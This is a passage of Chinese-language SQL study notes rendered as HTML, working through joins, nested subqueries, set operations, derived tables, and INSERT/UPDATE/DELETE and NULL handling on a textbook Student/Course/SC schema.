punctuation\">.</span>Sno<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202103658842.png\" alt=\"image-20221202103658842\" /></p>\n</li>\n<li>\n<p>对上一个例子使用自然连接完成</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Student<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span><span class=\"token punctuation\">,</span>SC<span class=\"token punctuation\">.</span>Cno<span class=\"token punctuation\">,</span>SC<span class=\"token punctuation\">.</span>Grade <span class=\"token keyword\">FROM</span> Student<span class=\"token punctuation\">,</span>SC <span class=\"token keyword\">where</span> Student<span class=\"token punctuation\">.</span>Sno<span class=\"token operator\">=</span>SC<span class=\"token punctuation\">.</span>Sno<span class=\"token punctuation\">;</span><span class=\"token comment\">#区别是去掉了比较的重复列</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202103938455.png\" alt=\"image-20221202103938455\" /></p>\n</li>\n</ul>\n</li>\n<li>\n<p>自身连接</p>\n<ul>\n<li>\n<p><code>查询每一门课的间接先修课</code> （即先修课的先修课）</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> table1<span class=\"token punctuation\">.</span>Con<span class=\"token punctuation\">,</span>table2<span class=\"token punctuation\">.</span>Cpno <span class=\"token keyword\">from</span> Course table1<span class=\"token punctuation\">,</span>Course table2 <span class=\"token keyword\">where</span> table1<span class=\"token punctuation\">.</span>Cpno<span class=\"token operator\">=</span>table2<span class=\"token punctuation\">.</span>Con<span class=\"token punctuation\">;</span><span class=\"token comment\">#这里需要对表进行别名使其自身相比</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202105430451.png\" alt=\"image-20221202105430451\" /></p>\n<p>&lt;font color=red&gt; 注，自身连接由于属性名相同，因此必须要用别名相互区别 &lt;/font&gt;</p>\n</li>\n</ul>\n</li>\n<li>\n<p>多表连接</p>\n<p>顾名思义就是俩个以上的表进行连接</p>\n<ul>\n<li>\n<p><code>查询每个学生的学号姓名选修的课程名及成绩</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Student<span class=\"token punctuation\">.</span>Sname<span class=\"token punctuation\">,</span>Course<span class=\"token punctuation\">.</span>Cname<span class=\"token punctuation\">,</span>SC<span class=\"token punctuation\">.</span>Grade <span class=\"token keyword\">FROM</span> Student<span class=\"token punctuation\">,</span>Course<span class=\"token punctuation\">,</span>SC <span class=\"token keyword\">WHERE</span> Student<span class=\"token punctuation\">.</span>Sno<span class=\"token operator\">=</span>SC<span class=\"token punctuation\">.</span>Sno <span class=\"token operator\">and</span> SC<span class=\"token punctuation\">.</span>Cno<span class=\"token operator\">=</span>Course<span class=\"token punctuation\">.</span>Con<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202115556674.png\" alt=\"image-20221202115556674\" /></p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"嵌套查询\"><a class=\"anchor\" href=\"#嵌套查询\">#</a> 嵌套查询</h3>\n<p>在 SQL 语言中每一个 SELECT-FROM-WHERE 为一个查询块将一个查询块嵌套到另一个查询块中的 where 或者 having 子句中查询称为嵌套查询</p>\n<p>SQL 的结构化的含义就是多以层层嵌套的方式来构造程序</p>\n<ol>\n<li>\n<p>带有 IN 谓词的子查询</p>\n<ul>\n<li>\n<p><code>查询与“刘留”在同一个系的学生</code></p>\n<ul>\n<li>\n<p>&lt;font color=blue&gt; 先查询 “刘留” 所在的系 &lt;/font&gt;</p>\n<pre><code class=\"language-SQL\">SELECT Sdept FROM Student where Sname='刘留';\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202124310325.png\" alt=\"image-20221202124310325\" /></p>\n</li>\n<li>\n<p>&lt;font color=blue&gt; 在查询所有在 CS 系的学生 &lt;/font&gt;</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">SELECT</span> Sname <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">where</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202125011126.png\" alt=\"image-20221202125011126\" /></p>\n</li>\n<li>\n<p>&lt;font color=blue&gt; 将两个语句嵌套完成 &lt;/font&gt;</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">where</span> Sdept <span class=\"token operator\">in</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> Sdept <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">where</span> Sname<span class=\"token operator\">=</span><span class=\"token string\">'刘留'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202125420911.png\" alt=\"image-20221202125420911\" /></p>\n<p><code>子查询的条件不依赖父查询，称为不相干子查询</code></p>\n</li>\n</ul>\n</li>\n<li>\n<p><code>查询选修了课程名为“信息系统”的学生学号和姓名</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">SELECT</span> Sno<span class=\"token punctuation\">,</span>Sname <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">WHERE</span> Sno <span class=\"token operator\">in</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> Sno <span class=\"token keyword\">FROM</span> SC <span class=\"token keyword\">where</span> Cno <span class=\"token operator\">in</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> Con <span class=\"token keyword\">from</span> Course <span class=\"token keyword\">where</span> Cname<span class=\"token operator\">=</span><span class=\"token string\">'信息系统'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202131341962.png\" alt=\"image-20221202131341962\" /></p>\n</li>\n</ul>\n</li>\n<li>\n<p>带有比较运算符的子查询</p>\n<ul>\n<li>\n<p><code>找出每个学生超过他自己选修课程平均成绩的课程号</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">SELECT</span> Sno<span class=\"token punctuation\">,</span>Cno <span class=\"token keyword\">FROM</span> SC x <span class=\"token keyword\">WHERE</span> Grade<span class=\"token operator\">>=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token function\">AVG</span><span class=\"token punctuation\">(</span>Grade<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> SC y <span class=\"token keyword\">WHERE</span> y<span class=\"token punctuation\">.</span>Sno<span class=\"token operator\">=</span>x<span class=\"token punctuation\">.</span>Sno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202133356393.png\" alt=\"image-20221202133356393\" /></p>\n</li>\n</ul>\n</li>\n<li>\n<p>带有 AND（SOME）或 ALL 谓词的子查询</p>\n<ul>\n<li>\n<p><code>查询非计算机科学系中比任意一个计算机科学系的学生年龄都小的学生的姓名和年龄</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Sname<span class=\"token punctuation\">,</span>Sage <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">WHERE</span> Sage<span class=\"token operator\">&lt;</span><span class=\"token keyword\">ANY</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> Sage <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">WHERE</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">and</span> Sdept<span class=\"token operator\">&lt;></span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#小于任意一个即可</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202134147599.png\" alt=\"image-20221202134147599\" /></p>\n</li>\n<li>\n<p><code>查询非计算机科学系中比任意一个计算机科学系的学生年龄都小的学生的姓名和年龄</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Sname<span class=\"token punctuation\">,</span>Sage <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">WHERE</span> Sage<span class=\"token operator\">&lt;</span><span class=\"token keyword\">ALL</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> Sage <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">WHERE</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">and</span> Sdept<span class=\"token operator\">&lt;></span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#小于所有</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202134555583.png\" alt=\"image-20221202134555583\" /></p>\n</li>\n</ul>\n</li>\n<li>\n<p>带有 EXISTS 谓词的子查询</p>\n<p>&lt;font color=red&gt; 带有 EXISTS 谓词的子查询不返回数据只返回逻辑真值与逻辑假值 &lt;/font&gt;</p>\n<ul>\n<li>\n<p><code>选修了一号课程的学生的姓名</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">SELECT</span> Sname <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">WHERE</span> <span class=\"token keyword\">EXISTS</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> SC <span class=\"token keyword\">where</span> Cno<span class=\"token operator\">=</span><span class=\"token string\">'1'</span> <span class=\"token operator\">AND</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Student<span class=\"token punctuation\">.</span>Sno<span class=\"token operator\">=</span>Sno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221202141805285.png\" alt=\"image-20221202141805285\" /></p>\n</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"集合查询\"><a class=\"anchor\" href=\"#集合查询\">#</a> 集合查询</h3>\n<p>集合操作的种类：</p>\n<ol>\n<li>并操作 UNION</li>\n<li>交操作 INTERSECT</li>\n<li>差操作 EXCEPT</li>\n</ol>\n<p>&lt;font color=red&gt; 注：参加集合操作的各查询结果的列数必须相同；对应的数据类型也必须相同 &lt;/font&gt;</p>\n<ol>\n<li>\n<p><code>查询计算机科学系的学生及年龄不大于19岁的学生</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sage<span class=\"token operator\">&lt;=</span><span class=\"token number\">19</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#union 将多个查询结果合并起来，系统自动去掉重复元组</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#union all 将多个查询结果合并起来，保留重复元组</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203132840712.png\" alt=\"image-20221203132840712\" /></p>\n</li>\n<li>\n<p><code>查询选修了课程1或者选修了课程2的学生</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span>  <span class=\"token keyword\">DISTINCT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> Student<span class=\"token punctuation\">,</span>SC <span class=\"token keyword\">where</span> Student<span class=\"token punctuation\">.</span>Sno<span class=\"token operator\">=</span>SC<span class=\"token punctuation\">.</span>Sno <span class=\"token operator\">and</span> SC<span class=\"token punctuation\">.</span>Cno<span class=\"token operator\">=</span><span class=\"token string\">'1'</span> <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">select</span>  <span class=\"token keyword\">DISTINCT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> Student<span class=\"token punctuation\">,</span>SC <span class=\"token keyword\">where</span> Student<span class=\"token punctuation\">.</span>Sno<span class=\"token operator\">=</span>SC<span class=\"token punctuation\">.</span>Sno <span class=\"token operator\">and</span> SC<span class=\"token punctuation\">.</span>Cno<span class=\"token operator\">=</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203133748443.png\" alt=\"image-20221203133748443\" /></p>\n</li>\n</ol>\n<h3 id=\"基于派生表的查询\"><a class=\"anchor\" href=\"#基于派生表的查询\">#</a> 基于派生表的查询</h3>\n<p>子查询不仅可以出现在 <code>where子句</code> 中，还可以出现在 <code>from子句</code> 中，这时子查询生成的 <code>临时派生表</code> 成为主查询对象</p>\n<p><code>查询每个学生超过他自己选修课程平均成绩的课程号</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> Sno<span class=\"token punctuation\">,</span>Cno <span class=\"token keyword\">from</span> SC<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> Sno<span class=\"token punctuation\">,</span><span class=\"token function\">avg</span><span class=\"token punctuation\">(</span>Grade<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> SC <span class=\"token keyword\">GROUP</span> <span class=\"token keyword\">BY</span> Sno<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> Avg_sc<span class=\"token punctuation\">(</span>avg_sno<span class=\"token punctuation\">,</span>avg_grade<span class=\"token punctuation\">)</span> <span class=\"token keyword\">WHERE</span> Sno<span class=\"token operator\">=</span>avg_sno <span class=\"token operator\">and</span> Grade<span class=\"token operator\">>=</span>avg_grade<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203142017891.png\" alt=\"image-20221203142017891\" /></p>\n<p><code>查询所有选修了1号课程的学生姓名</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">SELECT</span> Sname <span class=\"token keyword\">from</span> Student<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> Sno <span class=\"token keyword\">FROM</span> SC <span class=\"token keyword\">WHERE</span> Cno<span class=\"token operator\">=</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span> SC1 <span class=\"token keyword\">WHERE</span> Student<span class=\"token punctuation\">.</span>Sno<span class=\"token operator\">=</span>SC1<span class=\"token punctuation\">.</span>Sno<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203142502097.png\" alt=\"image-20221203142502097\" /></p>\n<h2 id=\"数据更新\"><a class=\"anchor\" href=\"#数据更新\">#</a> 数据更新</h2>\n<h3 id=\"插入数据\"><a class=\"anchor\" href=\"#插入数据\">#</a> 插入数据</h3>\n<ol>\n<li>\n<p>插入一个元组</p>\n<p>语句格式：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> <span class=\"token operator\">&lt;</span>表名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span>属性列<span class=\"token number\">1</span><span class=\"token operator\">></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>属性列<span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span>常量<span class=\"token operator\">></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>常量<span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><code>将一个新学生元组（学号：201215128）；姓名：陈冬；性别：男；所在系：IS；年龄：18岁）插入到Student表中。</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> Student<span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">,</span>Sname<span class=\"token punctuation\">,</span>Ssex<span class=\"token punctuation\">,</span>Sdept<span class=\"token punctuation\">,</span>Sage<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'201215128'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'陈东'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'男'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'IS'</span><span class=\"token punctuation\">,</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203204704729.png\" alt=\"image-20221203204704729\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203204727631.png\" alt=\"image-20221203204727631\" /></p>\n<p><code>插入一条选课记录（'201215128','1')</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">into</span> SC<span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">,</span>Cno<span class=\"token punctuation\">,</span>Grade<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span><span class=\"token punctuation\">(</span><span class=\"token string\">'201215128'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> <span class=\"token operator\">&lt;</span>表名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span>属性列<span class=\"token number\">1</span><span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>属性列<span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> 子查询：</pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203205007471.png\" alt=\"image-20221203205007471\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203205018798.png\" alt=\"image-20221203205018798\" /></p>\n<p><code>对每个系，求学生的平均年龄，并把结果存入数据库中</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* 先建表 */</span><span class=\"token keyword\">create</span> <span class=\"token keyword\">table</span> Dept_age <span class=\"token punctuation\">(</span>Sdept <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>avg_age <span class=\"token keyword\">SMALLINT</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203205512524.png\" alt=\"image-20221203205512524\" /></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">into</span> Dept_age<span class=\"token punctuation\">(</span>Sdept<span class=\"token punctuation\">,</span>avg_age<span class=\"token punctuation\">)</span> <span class=\"token keyword\">select</span> Sdept<span class=\"token punctuation\">,</span><span class=\"token function\">AVG</span><span class=\"token punctuation\">(</span>Sage<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">GROUP</span> <span class=\"token keyword\">BY</span> Sdept<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203205748078.png\" alt=\"image-20221203205748078\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203205811314.png\" alt=\"image-20221203205811314\" /></p>\n</li>\n</ol>\n<h3 id=\"修改数据\"><a class=\"anchor\" href=\"#修改数据\">#</a> 修改数据</h3>\n<p>基本格式：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">UPDATE</span> <span class=\"token operator\">&lt;</span>表名<span class=\"token operator\">></span> <span class=\"token keyword\">SET</span> <span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">>=</span><span class=\"token operator\">&lt;</span>表达式<span class=\"token operator\">></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">>=</span><span class=\"token operator\">&lt;</span>表达式<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">WHERE</span><span class=\"token operator\">&lt;</span>条件<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ol>\n<li>\n<p><code>将学生201215121的年龄改为22岁</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">UPDATE</span> Student <span class=\"token keyword\">SET</span> Sage<span class=\"token operator\">=</span><span class=\"token number\">22</span> <span class=\"token keyword\">where</span> Sno<span class=\"token operator\">=</span><span class=\"token string\">'201215121'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203215806818.png\" alt=\"image-20221203215806818\" /></p>\n</li>\n<li>\n<p><code>將所有學生年齡增加一歲</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">UPDATE</span> Student <span class=\"token keyword\">SET</span> Sage<span class=\"token operator\">=</span>Sage<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203215914475.png\" alt=\"image-20221203215914475\" /></p>\n</li>\n<li>\n<p><code>将计算机系的全体学生的成绩置0</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">UPDATE</span> SC <span class=\"token keyword\">set</span> Grade<span class=\"token operator\">=</span><span class=\"token number\">0</span> <span class=\"token keyword\">WHERE</span> Sno <span class=\"token operator\">in</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> Sno <span class=\"token keyword\">FROM</span> Student <span class=\"token keyword\">where</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203220428813.png\" alt=\"image-20221203220428813\" /></p>\n</li>\n</ol>\n<h3 id=\"删除数据\"><a class=\"anchor\" href=\"#删除数据\">#</a> 删除数据</h3>\n<p>语句格式</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">DELETE</span> <span class=\"token keyword\">FROM</span> <span class=\"token operator\">&lt;</span>表名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">WHERE</span><span class=\"token operator\">&lt;</span>条件<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>删除元组</p>\n<ol>\n<li>\n<p>删除一个元组的值</p>\n<ul>\n<li>\n<p><code>删除学号为201215128的学生记录</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">DELETE</span> <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sno<span class=\"token operator\">=</span><span class=\"token string\">'201215128'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203220934710.png\" alt=\"image-20221203220934710\" /></p>\n</li>\n</ul>\n</li>\n<li>\n<p>删除多个元组的值</p>\n<ul>\n<li>\n<p><code>删除所有学生的选课记录</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">DELETE</span> <span class=\"token keyword\">from</span> SC<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203221028823.png\" alt=\"image-20221203221028823\" /></p>\n</li>\n</ul>\n</li>\n<li>\n<p>带子查询的删除语句</p>\n<ul>\n<li>\n<p><code>删除计算机科学系所有学生的选课记录</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">DELETE</span> <span class=\"token keyword\">from</span> SC <span class=\"token keyword\">WHERE</span> Sno <span class=\"token operator\">in</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> Sno <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203221226462.png\" alt=\"image-20221203221226462\" /></p>\n</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"空值的处理\"><a class=\"anchor\" href=\"#空值的处理\">#</a> 空值的处理</h3>\n<ol>\n<li>\n<p>空值的产生</p>\n<ul>\n<li>\n<p><code>将Student表中学生号为201215125的学生所属的系改为空值</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">update</span> Student <span class=\"token keyword\">SET</span> Sdept<span class=\"token operator\">=</span><span class=\"token boolean\">NULL</span> <span class=\"token keyword\">where</span> Sno<span class=\"token operator\">=</span><span class=\"token string\">'201215125'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203221622264.png\" alt=\"image-20221203221622264\" /></p>\n</li>\n</ul>\n</li>\n<li>\n<p>空值的判断</p>\n<ul>\n<li>\n<p><code>从Student表中找出信息填漏了的学生信息</code></p>\n<figure class=\"highlight 